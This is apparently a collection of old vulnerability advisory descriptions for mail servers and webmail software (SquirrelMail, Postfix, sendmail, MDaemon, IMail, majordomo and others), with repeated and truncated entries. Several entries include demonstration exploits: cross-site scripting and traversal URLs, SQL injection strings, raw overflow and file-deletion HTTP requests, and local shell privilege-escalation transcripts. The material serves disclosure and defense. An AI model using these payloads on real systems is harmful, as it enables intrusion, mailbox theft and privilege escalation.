A remote user can conduct cross-site scripting attacks.\nThe private archive script does not properly filter HTML code from user-supplied input before displaying the input.

The code will originate from the site running the Mailman private archive software and will run in the security context of that site.  As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.\n\nThe vendor credits Moritz Naumann with discovering this vulnerability.",

A remote user may also be able to conduct cross-site scripting attacks.\nThe vendor reported that undefined variables in 'src/webmail.php' allow a remote user to supply specially crafted parameters to potentially cause an unauthorized file to be included and executed on the target system [CVE: CVE-2005-0103].\n\nA remote user can also create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser [CVE: CVE-2005-0104], also due to an error in 'src/webmail.php'. The code will originate from the site running the SquirrelMail software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. \n\nA missing variable initialization in 'functions/prefs.php' may allow a remote user to cause unauthorized files to be included and executed on the target system if the register_globals is set to On [CVE: CVE-2005-0075].  Jimmy Conner is credited with discovering this flaw.\n\nAn initialization error in 'src/webmail.php' allows a remote user to manipulate a URL under certain circumstances where register_globals and allow_url_fopen are both set to 'on' to cause the target server to execute arbitrary code with the privileges of the web server [CVE: CVE-2005-0152].  Grant Hollingworth is credited with discovering this flaw.",

A remote user may also be able to conduct cross-site scripting attacks.\nThe vendor reported that undefined variables in 'src/webmail.php' allow a remote user to supply specially crafted parameters to potentially cause an unauthorized file to be included and executed on the target system [CVE: CVE-2005-0103].\n\nA remote user can also create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser [CVE: CVE-2005-0104], also due to an error in 'src/webmail.php'. The code will originate from the site running the SquirrelMail software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. \n\nA missing variable initialization in 'functions/prefs.php' may allow a remote user to cause unauthorized files to be included and executed on the target system if the register_globals is set to On [CVE: CVE-2005-0075].  Jimmy Conner is credited with discovering this flaw.\n\nAn initialization error in 'src/webmail.php' allows a remote user to manipulate a URL under certain circumstances where register_globals and allow_url_fopen are both set to 'on' to cause the target server to execute arbitrary code with the privileges of the web server [CVE: CVE-2005-0152].

    "Description": "Tan Chew Keong of SIG^2 reported several vulnerabilities in Magic Winmail Server.  The webmail, IMAP, and FTP services are affected. A remote authenticated user can view and upload arbitrary files and create and delete arbitrary directories.  A remote authenticated user can also conduct cross-site scripting attacks.\nA remote authenticated user can invoke the 'download.php' script with specially crafted parameters to obtain arbitrary files with the privileges of the web service.  The script does not properly validate the user-supplied input.\n\nA remote authenticated user can invoke the 'upload.php' script to upload files to arbitrary directories with the privileges of the web service.  The script is normally used to upload e-mail attachments, but can be exploited to modify the user-supplied filename and cause the file to be placed in an alternate location because the script does not properly validate the user-supplied input.  The user can upload arbitrary PHP scripts and cause the Magic Winmail server to execute them with Local System privileges.\n\nThe '/admin/user.php' Webmain administration script does not properly filter HTML code when viewing a webmail user's username, fullname, description, and company name.  If a user has submitted specially crafted text via 'userinfo.php' and the administrator views this information, arbitrary scripting code will be executed by the target administrator's browser. The code will originate from the site running the Magic Winmail server software and will run in the security context of that site. As a result, the code will be able to access the target administrator's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target administrator via web form to the site, or take actions on the site acting as the target administrator. \n\nA remote authenticated IMAP user can invoke certain IMAP commands to view arbitrary files on the target system (including the e-mail of other users) or to create or delete arbitrary directories on the target system.  IMAP commands such as CREATE, EXAMINE, SELECT, and DELETE do not properly validate user-supplied input to prevent directory traversal attacks.\n\nThe FTP service does not validate the user-supplied IP address provided in an FTP PORT command.  A remote authenticated user can issue a PORT command with an alternate IP address to cause the FTP server to attempt to connect to the specified port number on the specified IP address.  This can be exploited to conduct port scans against IP addresses that the FTP server has connectivity to (possibly including hosts behind a firewall).\n\nThe vendor was notified on January 16, 2005.\n\nThe original advisory is available at:\n\nhttp://www.security.org.sg/vuln/magicwinmail40.html",

A remote user can supply a specially crafted value to point to the mailbox of a target user on the system to access the target user's mailbox.  This flaw affects the flat file installation option.  A demonstration exploit URL is provided:\n\nhttp://[target]/showmail.pl?Folder=../../victim@[target]/mbox/Inbox\n\n In the SQL database installation option, it is reported that a remote user can inject SQL commands to be executed by the underlying database due to input validation flaws in the 'atmail.pl', 'search.pl', and 'reademail.pl' scripts.  A remote user can exploit this to view arbitrary e-mail messages for any target user on the target system.  A demonstration exploit URL to open the e-mail message with message ID '666'  for the 'victim@atmail.com' user account is provided:\n\n-http://[target]/reademail.pl?id=666&folder=qwer'%20or%20EmailDatabase_v.Account='victim@atmail.com&print=1\n\nIt is also reported that a remote user can modify their mailbox name cookie to gain access to a target user's mailbox if the target user has an active session at the time.  This flaw applies to the SQL database installation option.\n\nIt is also reported that the 'showmail.pl' script does not filter HTML code from user-supplied requests before displaying the user-supplied information.  A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the @Mail software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies) associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.\n\nA demonstration exploit URL is provided:\n\nhttp://[target]/showmail.pl?Folder=<script>alert(document.cookie)</script>\n\nThe vendor was reportedly notified on Dec 2, 2003 without response.",

    "Description": "Several vulnerabilities were reported in the ASN.1 parsing code in OpenSSL.  A remote user may be able to cause arbitrary code to be executed on a server application that uses OpenSSL.\nIt is reported that a remote user can send a specially crafted SSL client certificate containing invalid ASN.1 tag values to trigger a flaw in OpenSSL and cause OpenSSL to crash due to \"out of bounds reads\" (CVE: CVE-2003-0543 and CVE-2003-0544).  These flaws affected 0.9.6 and 0.9.7.  The specific impact depends on the application using OpenSSL.  The report indicates that the effects against Apache (when using OpenSSL) are \"limited\" and only cause Apache httpd child processes to crash.\n\nIt is also reported that certain ASN.1 encodings detected to be invalid may trigger a double free of the ASN1_TYPE variable, deallocating memory that has already been deallocated (CVE: CVE-2003-0545).  This flaw only affects 0.9.7.  A remote user may be able to send a specially crafted SSL client certificate to an application that uses OpenSSL to potentially execute arbitrary code.  The exact impact depends on how the application uses OpenSSL.\n\nIt is also reported that a remote user can specify an invalid public key in a certificate to cause the verify code to crash if the target server is configured to ignore public key decoding errors.  The vendor notes that ignoring public key decoding errors is usually only done in debugging situations and not usually in production code.  [Editor's note:  A CVE number had not yet been assigned to this issue at the time of this entry.]\n\nNISCC is credited with discovering these vulnerabilities.\n\nThe vendor reports a fourth related security issue, where an error in the SSL/TLS protocol handling will cause a server to parse a client certificate even when a client certificate is not specifically requested.  As a result, any server application that uses OpenSSL can be attacked using the vulnerabilities described above, even if the server application does not enable client authentication.",

A remote user can also determine the installation path and can conduct cross-site scripting attacks against web mail users.\nIt is reported that the POP server returns different error messages in response to valid login attempts versus invalid login attempts. When an invalid user name is specified, the POP server will respond with:\n\n-ERR InValid doesn't get mail here\n\nWhen a valid user name is specified, the POP server reportedly responds with the following information:\n\n+OK user1 gets mail here\n\nIt is also reported that a remote user can request the following file to view the system installation path:\n\nhttp://127.0.0.1:8089/utility/wmsecurity.fts\n\nIt is also reported that the server does not filter user-supplied HTML when displaying user supplied input via the 'index.fts' script.  A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the mail server software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.\n\nA demonstration exploit URL is provided:\n\nhttp://127.0.0.1:8089/help/index.fts?href=<script>alert('C.S.S')</script>\n\nThe vendor was reportedly notified on August 28, 2003.",

A remote user can use a Postfix server to scan for open/closed ports on other hosts.\nIt is reported that a remote user can use a target Postfix server to conduct bounce scans of other hosts or denial of service attacks against other hosts.\n\nA remote user can send a probing message to the following address (RCPT TO):\n\n<[server_ip]:service!@local-host-name>\n\nThe target Postfix server will then attempt to connect to the specified port on the specified victim server.  If the specified port is open, the target Postfix server will wait until the SMTP greeting timeout occurs before queueing the message.  If the specified port if closed, the target Postfix server will immediately queue the message.  By examining error messages eventually returned to the sender by the target Postfix server, the remote user (i.e., the sender) can determine which ports are open/closed on the specified victim server, according to the report.\n\nThe remote user can engage many Postfix servers to direct a large number of connections to a victim server to attempt a distributed denial of service attack.\n\nPostfix versions 1.1.12 and 2.0 are reportedly not affected.",

    "Description": "A denial of service vulnerability was reported in Postfix.  A remote user may be able to cause the queue manager to lock up.\nIt is reported that the address parser code contains a flaw.  A remote user can create a specially crafted envelope address in the SMTP header to cause the 'nqmgr' process to lock up.  The exploit message's destination address must reportedly be crafted to cause a bounce (e.g., \"<nonexistent@local-server-name>\", \"<nonexistent@[127.0.0.1]>\") and the \"mail from\" or \"Errors-To\" addresses must reportedly be of the form \"<.!>\" or \"<.!@local-server-name>\".  According to the report, when the code attempts to parse and rewrite the from/error address, the queue manager will lock up.\n\nThe offending message must be removed before the queue manager is restarted in order to return to normal operations.\n\nIt is also reported that a remote user can cause an instance of the SMTP listener to lock up by sending a specially crafted \"RCPT TO\" address of the form \"<.!>\" or \"<.!@local-server-name>\".  By repeating this method, the remote user can cause denial of service conditions.\n\nThe report indicates that the system will write the following messasge to the mail log file when the flaw is triggered:\n\n\"resolve_clnt_query: null recipient\"\n\nVersions prior to 1.1.9 are not vulnerable in the default configuration, unless the 'append_dot_mydomain' setting is disabled via the configuration file.\n\nVersion 2.0 is not affected, according to the report.\n\nThe vendor was reportedly notified on July 27, 2003.",

The exploit message's destination address must reportedly be crafted to cause a bounce (e.g., \"<nonexistent@local-server-name>\", \"<nonexistent@[127.0.0.1]>\") and the \"mail from\" or \"Errors-To\" addresses must reportedly be of the form \"<.!>\" or \"<.!@local-server-name>\".  According to the report, when the code attempts to parse and rewrite the from/error address, the queue manager will lock up.\n\nThe offending message must be removed before the queue manager is restarted in order to return to normal operations.\n\nIt is also reported that a remote user can cause an instance of the SMTP listener to lock up by sending a specially crafted \"RCPT TO\" address of the form \"<.!>\" or \"<.!@local-server-name>\".

A remote user can use a Postfix server to scan for open/closed ports on other hosts.\nIt is reported that a remote user can use a target Postfix server to conduct bounce scans of other hosts or denial of service attacks against other hosts.\n\nA remote user can send a probing message to the following address (RCPT TO):\n\n<[server_ip]:service!@local-host-name>\n\nThe target Postfix server will then attempt to connect to the specified port on the specified victim server.  If the specified port is open, the target Postfix server will wait until the SMTP greeting timeout occurs before queueing the message.  If the specified port if closed, the target Postfix server will immediately queue the message.

Thus, a remote user can setup an account with a user ID that has the same first two letters as the target user's account (e.g., \"sam\" vs. \"sal\").

    "Description": "Several buffer overflow vulnerabilities were reported in the Hypermail web-based mail system.  A remote user can execute arbitrary code on the system.\nIt is reported that a remote user can send a specially crafted e-mail message with a long attachment file name (252 characters) to a target user that has an account on a Hypermail system to trigger a buffer overflow.  The overflow can reportedly be triggered when Hypermail is in a certain configuration (option progress set to 2).  The overflow resides in the parsemail() function in the 'parse.c' file and allows the remote user to execute arbitrary code on the system with the privileges of the Hypermail process.\n\nAccording to the report, there are other buffer overruns in the parsemail() function, but those may not be exploitable.\n\nIt is also reported that the 'mail' CGI component of Hypermail contains a flaw.  A buffer overflow can be triggered when a reverse DNS lookup is performed if the hostname returned is 122 characters.  A remote user with control of a DNS server or the ability to spoof the DNS can supply a specially crafted hostname value to cause arbitrary code to be executed by the mail CGI script.\n\nFinally, the mail CGI program can also be invoked by remote users to send e-mail to arbitrary recipients.",

A remote user can execute arbitrary code on the system.\nIt is reported that a remote user can send a specially crafted e-mail message with a long attachment file name (252 characters) to a target user that has an account on a Hypermail system to trigger a buffer overflow.  The overflow can reportedly be triggered when Hypermail is in a certain configuration (option progress set to 2).  The overflow resides in the parsemail() function in the 'parse.c' file and allows the remote user to execute arbitrary code on the system with the privileges of the Hypermail process.\n\nAccording to the report, there are other buffer overruns in the parsemail() function, but those may not be exploitable.\n\nIt is also reported that the 'mail' CGI component of Hypermail contains a flaw.  A buffer overflow can be triggered when a reverse DNS lookup is performed if the hostname returned is 122 characters.  A remote user with control of a DNS server or the ability to spoof the DNS can supply a specially crafted hostname value to cause arbitrary code to be executed by the mail CGI script.\n\nFinally, the mail CGI program can also be invoked by remote users to send e-mail to arbitrary recipients.",

A local user may be able to bypass smrsh access restrictions and execute a user-specific binary on the system.\niDEFENSE reported that a local user can insert a special character sequence into their '.forward' file to exploit the flaw.\n\nOne method is to insert the '||' string, as shown in the demonstration exploit transcript below:\n\n$ echo \"echo unauthorized execute\" > /tmp/unauth\n$ smrsh -c \". || . /tmp/unauth || .\" \n  /bin/sh: /etc/smrsh/.: is a directory\n  unauthorized execute\n\nAccording to the report, smrsh will verify that the '.' exists but does not perform verification on files listed after the '||' string, so /tmp/unauth is executed even though it is not located within the '/etc/smrsh' restricted directory.  To exploit this, the local user can place the following line in the '.forward' file:\n\n\"| . \\|| . /tmp/unauth \\|| .\"\n\nAnother method is to provide a command line to smrsh that will be internally converted to a space, thereby bypassing all access filters.

A remote user can cause the mail server to become unavailable and can also conduct cross-site scripting attacks against mail server users.\nNSSI-Research Labs issued an advisory warning of several flaws in the Kerio MailServer.\n\nA remote user can sending multiple TCP SYN packets to all active services on the mail server (POP3, SMTP, IMAP, Secure IMAP, POP3S, Web-mail, Secure Web-mail) to stop the mail server from responding to requests.  According to the report, only 5 TCP SYN packets are requred.  This will cause the system to consume all available resources on the system for several minutes.  After that, the service will apparently return to normal operations.\n\nIt is also reported that several of the pages on the web mail portion of the system allow a remote user to conduct cross-site scripting attacks against Kerio users.  A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will appear to originate from the mail server's web-mail interface and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.\n\nThe following pages are affected:\n\nhttp://<kerio webmail>/login\nhttp://<kerio webmail>/search\nhttp://<kerio webmail>/settings\nhttp://<kerio webmail>/new\nhttp://<kerio webmail>/list\nhttp://<kerio webmail>/logout\n\nThe vendor has reportedly been notified.",

A remote user can determine the web root directory path and can conduct cross-site scripting attacks against other EMU Webmail users.\nA remote user can reportedly determine the web root path by inserting the following type of string into the e-mail form:\n\n<script>alert(@)</script>\n\nIt is also reported that the \"Form Object Field\" on the main page does not filter HTML tags.  A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the EMU Webmail site and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

A remote user could potentially obtain a Mailman user's authentication cookies or take actions acting as that Mailman user.\nThe vendor reported that there are two cross-site scripting bugs.\n\nOne bug is in the administrator login page (with source code in Utils.py).  A remote user could create an HTML link referring to that page that, when loaded by a target (victim) user, would cause arbitrary scripting to be executed by the target user's browser.  The code could obtain the target user's cookies associated with the site running Mailman.\n\nThe other bug is in the Pipermail archiving component of Mailman (with source code in Archiver/HyperArch.py).  A remote user can create an e-mail message with encoded scripting in the 'Subject' or 'From' fields in a manner that, when it is archived and indexed by Pipermail and then a target user views the index summary, arbitrary code may be executed by the target user's browser.  The code could obtain the target user's cookies associated with the site running Pipermail.\n\nThe vendor credits \"office\" and Tristan Roddis with reporting these flaws.",

A remote user can reportedly send an e-mail containing a MIME attachment executable to a POP3 e-mail account of a W3Mail user.

A remote user with access to the SMTP port and with control over a DNS server (or with the ability to spoof DNS) can cause arbitrary code to be executed on the system.\nMicrosoft reported that the Internet Mail Connector (IMC) of Microsoft Exchange Server contains a flaw in creating responses to extended Hello (EHLO) protocol commands received from a remote SMTP server.  This component is reportedly also referred to as the Exchange Server Internet Mail Service.\n\nIf the length of a reply message exceeds a particular value, the overflow is triggered.  According to the report, the reply message adheres to the following format:\n\n250-<Exchange server ID>Hello<Connecting server ID>\n\nIn the above format, <Exchange server ID> is the fully-qualified domain name (FQDN) of the Exchange server and <Connecting server ID> is either the FQDN or the IP address of the server that initiated the connection. \n\nA remote user with control over a DNS server (or with the ability to spoof DNS) could cause a specially crafted value to be returned in response to the Exchange Server's reverse DNS lookup.  The length of the IMC s own FQDN plus that of the remote server s FQDN must exceeded a particular value for the attack to be successful.  This could cause the IMC to crash or cause arbitrary code to be executed by the system.  Arbitrary code would run with the privileges of the IMC (System-level privileges).\n\nAccording to Microsoft, Exchange 2000 and the SMTP service that ships in Windows 2000 are not affected.\n\nMicrosoft credits Dan Ingevaldson of Internet Security Systems for reporting this issue.",

A remote user with control of a DNS server may be able to trigger the overflow if the server is configured in a specific manner.\nSendmail, Inc., and the Sendmail Consortium announced that there is 'theoretical' buffer overflow in 'sendmail'.  According to the report, the vulnerable code is not used by any configuration shipped with sendmail. \n\nThe vulnerability occurs when the DNS map is used with the type TXT and sendmail queries a malicious DNS server.\n\nAccording to the report, if your system uses a custom DNS map definition to query DNS TXT records (e.g., Kdnstxt dns -R TXT), then your system may be vulnerable.\n\nSendmail credits Joost Pol of PINE Internet and Anton Rang of Sun Microsystems with independently reporting this flaw.",

The code could obtain the target user's cookies associated with the site running Mailman.\n\nThe other bug is in the Pipermail archiving component of Mailman (with source code in Archiver/HyperArch.py).

    "Description": "A denial of service vulnerability was reported in sendmail.  A local user can use file locking mechanisms on critical sendmail files to deny service to all sendmail users.\nIt is reported that sendmail uses either flock() or fcntl() style locking, depending on the version of sendmail, to protect certain critical files used by sendmail.  A local user could use flock() or fcntl() to place a lock on a sendmail file such that sendmail itself will not be able to lock the file, thereby creating a denial of service condition for sendmail as it waits for the other lock to be dropped.\n\nAccording to the report, the critical sendmail files that may be affected are the alias, map, statistics, and pid files.   These files should be configured to be owned by root or by the trusted user specified in the TrustedUser option.  If the files are set to be readable and/or writable by other users, the system may be vulnerable.",
    "Impact'": "A local user can lock critical sendmail files to cause denial of service conditions for sendmail.",
    "Solution": "As long as a user can not open a file, the user cannot use either flock() or fcntl() to lock the file.  So, a workaround is to protect all files that are locked by sendmail such that the files cannot be opened by untrusted users.  Because sendmail queue files should already have restricted permissions, it is reported that the critical sendmail files that should be protected are the alias, map, statistics, and pid files.  These files should be configured to be owned by either root or by the trusted user specified in the TrustedUser option.  Change the permissions on these files to be readable and writable by only that user, as shown in the following examples (these examples are path dependant):\n\n\tchmod 0640 /etc/mail/aliases /etc/mail/aliases.{db,pag,dir}\n\tchmod 0640 /etc/mail/*.{db,pag,dir}\n\tchmod 0640 /etc/mail/statistics /var/log/sendmail.st\n\tchmod 0600 /var/run/sendmail.pid /etc/mail/sendmail.pid\n\nNote that if /var/run/ directory is cleared on reboots (thereby erasing the sendmail.pid file), you must add a chmod command for the pid file in the sendmail startup script to be executed after sendmail is started.  Otherwise, the pid file will have insecure permissions.\n\nIf the permissions 0640 (group readable) are used on any of these files, ensure that only trusted users belong to the group assigned to those files.  Otherwise, ensure that the files are not group readable.\n\nAccording to the report, sendmail 8.12.4 will change the default permissions for newly created map and alias database files to mode 0640, the installation process will create the statistics file with mode 0600 if it does not already exist, and the pid file will be created with mode 0600.  A future version of sendmail will reportedly introduce a feature to limit the amount of time spent waiting for a file lock to avoid denial of service conditions.\n\nTo determine what processes are holding locks on your system, use a tool that reads process file descriptor tables, such as lsof, available from:\n\n\tftp://vic.cc.purdue.edu/pub/tools/unix/lsof/\n\nWith lsof, you can find the process or processes holding a shared or exclusive lock on a file as follows:\n\n\t# lsof /etc/settings\n\tCOMMAND   PID USER   FD   TYPE     DEVICE SIZE/OFF NODE NAME\n\tlockit  25472 badguy  3rW VREG 116,131072     1841  292 /etc/settings\n\nIn the above lsof example, user 'badguy' has a process named 'lockit' (pid 25472) that has the '/etc/settings' file opened for reading ('r') and has obtained an exclusive write ('W') lock as shown in the FD column.  If this condition was due to a malicious user, the system administrator could kill the offending process to drop the lock.",

    "Description": "Several vulnerabilities were reported in Deerfield.com's MDaemon mail server and associated components, including the WorldClient web-mail feature.  A remote user can execute arbitrary code on the server with SYSTEM privileges and can perform other actions on the server.\nEyeonSecurity reported several flaws in MDaemon.\n\nIt is reported that MDaemon creates a default user account called 'MDaemon' with the default password of 'MServer'.  Remote users may access the system using this account if the administrator does not change this password.\n\nIt is also reported that the product uses a weak encoding method to protect password files.  By default, the passwords are apparently stored in a file called 'userlist.dat' in the MDaemon/App directory (usually C:\\MDaemon\\App\\userlist.dat).  Each character is encoded using a static offset and the final result is base64 encoded.  As a result, a local user can obtain and decode user passwords.\n\nThe WorldClient web-mail feature reportedly contains a buffer overflow that can be triggered when an authenticated remote user attempts to create a folder with a long name.  The vulnerability can apparently be triggered if the folder name is approximately 1000 characters long.  User-supplied code can reportedly be executed with SYSTEM level privileges.\n\nA demonstration exploit is provided:\n\nPOST /WorldClient.cgi?Session=xxxx&View=Options-Folders&Reload=Yes\nHTTP/1.1\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; Q312461)\nHost: victim:3000\nContent-Length: 1636\nConnection: Keep-Alive\nCookie: User=MDaemon; Lang=en; Theme=Standard; Session=xxxxx\n\nOldFolderParent=&OldFolder=&FolderParent=&Folder=&NewFolder=AAAAAAAAAAAA\nAAA[BUFFER_HERE_1000+chars]&NewFolderParent=&Create=Create&Folder%3AInbo\nx=Inbox&Folder%3ADrafts=Drafts&Folder%3ASent=Sent&Folder%3ATrash=Trash&F\nolder%3As=s\n\nA remote user can reportedly delete arbitrary files on the server that are located on the same partition (drive) as MDaemon.  The server apparently does not restrict the use of certain character strings such as \"../\" when a user deletes attached files.  \n\nA demonstration exploit example is provided:\n\nPOST /WorldClient.cgi?Session=xxxx&View=Compose-Attach HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*\nReferer:\nhttp://victom.com:3001/WorldClient.cgi?Session=xxxx&View=Options-Folders\nContent-Type: multipart/form-data;\nboundary=---------------------------7d2851b9074c\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; Q312461)\nHost: victim:3001\nContent-Length: 407\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: User=MDaemon; Lang=en; Theme=Standard; Session=xxxx\n\n-----------------------------7d2851b9074c\nContent-Disposition: form-data; name=\"Attachment\"; filename=\"\"\nContent-Type: application/octet-stream\n\n-----------------------------7d2851b9074c\nContent-Disposition: form-data; name=\"Attachments\"\n\n..\\..\\test.txt\n-----------------------------7d2851b9074c\nContent-Disposition: form-data; name=\"Remove\"\n\nRemove\n-----------------------------7d2851b9074c--",

An example of this type of configuration is where all incoming mail is sent directly to a virus checker by means of a pipe, without inspecting the local parts of addresses.\n\nThe bug can reportedly be triggered by routing/directing an address whose local part begins with a pipe symbol (vertical bar, \"|\") to a pipe transport.

A remote user could cause arbitrary code to be executed by an OWA user's browser when the OWA user views a malicious e-mail.\nA flaw reportedly exists in the way OWA, in conjunction with Internet Explorer, handles inline scripts in HTML-based e-mail messages. A remote user can create a specially crafted HTML-based message that contains a specially formatted script in the body of the message so that when the the message is opened in OWA, the script will execute on the recipient's browser.\n\nThe script can apparently take any action against the user's Exchange mailbox that the user himself is capable of, including sending, moving, or deleting messages.",

The server does not filter out HTML characters and is vulnerable to cross-site scripting attacks.\nIt is reported that fml, as distributed in Debian GNU/Linux 2.2 (and possibly other distributions), allows cross-site scripting attacks. When the application generates index pages for list archives, it fails to escape the `<' and `>' characters in the e-mail subject field.\n\nA remote user can create an e-mail that contains a subject field with embedded HTML code with Javascript.  When another user views the archive containing that e-mail message, the Javascript code may be executed by that user's browser.  The Javascript code will appear to originate from the server running the fml mailing list archive, which may be a server that the user's browser trusts.  The Javascript code could potentially access the user's cookies or other sensitive information related to that server.",

    "Description": "BindView's RAZOR security team warned of multiple vulnerabilities in Sendmail.  The security holes allow a local user to obtain elevated privileges on the system.\nSeveral vulnerabilities were reported:\n\n1) It is reported that a programming error in version 8.12.0 caused Sendmail to fail to drop extra privileges and run at the user level when processing untrusted, user-supplied configurations.  The software reportedly retains the saved group id (gid) of 'smmsp'.  A local user can call the setregid() function to regain these 'dropped' privileges.  To do this, the local user must take control of Sendmail.  RAZOR reports tht that can be done by exploiting various aspects of the configuration file parsing code, as described in the Source Message.\n\nOnce the local user has gained control of the Sendmail process, the local user can issue the setregid() system call and gain smmsp group access permissions.  With these group privileges, the local user can access and modify the user-level queue (/var/spool/clientmqueue), reading or modifying the mail of other users.  It may also be possible to obtain elevated privileges (root level group id of \"0\") via methods vaguely described in the Source Message.\n\n2) It is reported that a programming bug in Sendmail allows a local user to specify mail delivery options that will be inadvertently processed by Sendmail.  For example, the local user can force Sendmail to drop queue contents by setting initial message hop count above the limit with the following command:\n\nsendmail -q -h1000\n\nSpecific queue entries can apparently be targeted using parameters such as -qR and -qS.  This can lead to data loss.\n\nSendmail systems that do not permit users to run the queue (RestrictQRun option) are not affected by this vulnerability.\n\n3) Information may reportedly be leaked in debug mode.  A local user can use debugging flags to obtain the complete mail system configuration and gather potentially sensitive information about the mail queue (e.g., full message path, subject, mail software), such as with the following command:\n\n    sendmail -q -d0-nnnn.xxx\n\nwhere nnnn and xxx specify debugging levels.\n\nIt is reported that Sendmail systems that do not allow users to run the queue (RestrictQRun option) are not affected by this vulnerability.",

The security holes allow a local user to obtain elevated privileges on the system.\nSeveral vulnerabilities were reported:\n\n1) It is reported that a programming error in version 8.12.0 caused Sendmail to fail to drop extra privileges and run at the user level when processing untrusted, user-supplied configurations.  The software reportedly retains the saved group id (gid) of 'smmsp'.  A local user can call the setregid() function to regain these 'dropped' privileges.  To do this, the local user must take control of Sendmail.  RAZOR reports tht that can be done by exploiting various aspects of the configuration file parsing code, as described in the Source Message.\n\nOnce the local user has gained control of the Sendmail process, the local user can issue the setregid() system call and gain smmsp group access permissions.  With these group privileges, the local user can access and modify the user-level queue (/var/spool/clientmqueue), reading or modifying the mail of other users.  It may also be possible to obtain elevated privileges (root level group id of \"0\") via methods vaguely described in the Source Message.\n\n2) It is reported that a programming bug in Sendmail allows a local user to specify mail delivery options that will be inadvertently processed by Sendmail.  For example, the local user can force Sendmail to drop queue contents by setting initial message hop count above the limit with the following command:\n\nsendmail -q -h1000\n\nSpecific queue entries can apparently be targeted using parameters such as -qR and -qS.  This can lead to data loss.\n\nSendmail systems that do not permit users to run the queue (RestrictQRun option) are not affected by this vulnerability.\n\n3) Information may reportedly be leaked in debug mode.  A local user can use debugging flags to obtain the complete mail system configuration and gather potentially sensitive information about the mail queue (e.g., full message path, subject, mail software), such as with the following command:\n\n    sendmail -q -d0-nnnn.xxx\n\nwhere nnnn and xxx specify debugging levels.\n\nIt is reported that Sendmail systems that do not allow users to run the queue (RestrictQRun option) are not affected by this vulnerability.",

Validated and authenticated remote users can access other user e-mail accounts and can cause denial of service conditions.\nIt is reported that IMail uses predictable session IDs that can be feasibly guessed through analysis.  Some example session IDs are provided in the Source Message.\n\nA remote user can hijack an e-mail session if the remote user is able to guess a valid session ID.  The remote user does not need to know any user names or passwords to achieve this.\n\nIn addition, a remote user can attempt to obtain a session ID by other means.  Because session IDs are URL based, they could be obtained (for example) by sending  the target user an HTML-based e-mail with an embedded image link.  When the user views the message, the image link will be followed, and the user's web browser will disclose the Session ID via the HTTP Referrer field.  Other methods described in the Source Method are reportedly possible.\n\nA remote but valid and authenticated mail user can gain access to other users' mailboxes by exploiting an input validation flaw and traversing the mailbox directory.  The following type of URL can be used by a valid and authenticated 'user1' to access the main inbox of 'user2':\n\nhttp://xx.xx.xx.xx:8383/<user1 sessionid>/readmail.cgi?uid=user1&mbx=../user2/Main\n\nInformation about the IMail directory structure is reportedly disclosed when a user sends an e-mail.

Additionally sendmail checks whether the privileges\n    can be regained when they should have been dropped in which case\n    sendmail refuses to run.\n\n  - The PrivacyOptions RestrictQRun is set by default for mail submission\n    (submit.cf) to avoid privacy leaks or mail loss due to mailicous\n    local users.\n\n  - 8.12.1 prevents information leakage when sendmail has extra\n    privileges by disabling debugging (command line -d flag) during queue\n    runs and disabling ETRN when sendmail -bs is used.\n\n  - 8.12.1 limits mail submission command line flags (i.e., -G, -h,\n    -F, etc.) to mail submission operating modes (i.e., -bm, -bs, -bv,\n    etc.) when sendmail is running with extra privileges.\n\n  - Additonal test programs are distributed with sendmail that\n    can check whether the required functionality of system calls is\n    available.

The archive2.pl program can be used to append a malicious file to majordomo's .bash_profile (or .profile) file using the following commands:\n\necho \"ln -s /bin/sh ~/majordomo/sh 2>/dev/null\">test \n\n~majordomo/wrapper archive2.pl -f .bash_profile -a ~marco/test \n\nOnce this has been done, the symbolic link specified in the malicious 'test' file will be created when the .bash_profile is loaded.  Then, any local user can call the wrapper program to obtain a shell with majordomo user privileges and daemon group privileges, as shown in the following exploit transcript:\n\n~majordomo/wrapper sh \nsh-2.05$ id -a \nuid=666(majordomo) gid=2(daemon) groups=100(users) \nsh-2.05$",

